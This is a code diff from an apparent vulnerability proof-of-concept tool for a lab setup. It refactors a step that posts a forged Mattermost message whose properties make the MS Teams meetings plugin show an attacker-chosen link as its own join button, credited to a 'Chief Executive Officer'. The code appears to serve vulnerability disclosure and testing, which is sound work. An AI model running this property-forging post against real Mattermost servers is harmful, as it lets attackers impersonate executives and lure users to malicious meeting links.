@@ -74,6 +74,35 @@ function fromPluginInChannel(lab: Lab): (post: Seen) => boolean {
  * Shows that a member's post properties become the plugin's own "join" button, and that without
  * the planted post the plugin does not offer one.
  */
+/** Plants the attacker's post and stops, so a person can run the command in a browser. */
+export async function plantPropsHijack(): Promise<number> {
+  try {
+    const lab = loadLab()
+    if (!lab) throw new Error("no lab. Run: shuvuln lab up")
+    await plantPost(lab)
+    console.log(
+      `planted. Within 30 seconds, run "/mstmeetings start" in ${lab.base} as the victim.`
+    )
+    return 0
+  } catch (error) {
+    console.error(`error:  ${message(error)}`)
+    return 1
+  }
+}
+
+async function plantPost(lab: Lab): Promise<void> {
+  const attacker = await Mattermost.login(lab.base, ACCOUNTS.attacker)
+  await attacker.request("POST", "/api/v4/posts", {
+    channel_id: lab.channelId,
+    message: "shall we hop on a call?",
+    props: {
+      meeting_provider: "MSTeams",
+      meeting_link: ATTACKER_LINK,
+      meeting_creator_username: "Chief Executive Officer",
+    },
+  })
+}
+
 export async function provePropsHijack(): Promise<number> {
   try {
     const lab = loadLab()
@@ -89,16 +118,7 @@ export async function provePropsHijack(): Promise<number> {
         : "  the bot posted no meeting post within 20 seconds"
     )
 
-    const attacker = await Mattermost.login(lab.base, ACCOUNTS.attacker)
-    await attacker.request("POST", "/api/v4/posts", {
-      channel_id: lab.channelId,
-      message: "shall we hop on a call?",
-      props: {
-        meeting_provider: "MSTeams",
-        meeting_link: ATTACKER_LINK,
-        meeting_creator_username: "Chief Executive Officer",
-      },
-    })
+    await plantPost(lab)
     const planted = await watchFor(lab, ACCOUNTS.victim, 20, fromPluginInChannel(lab))
     await planted.ready
     await runCommand(lab, ACCOUNTS.victim, "/mstmeetings start")
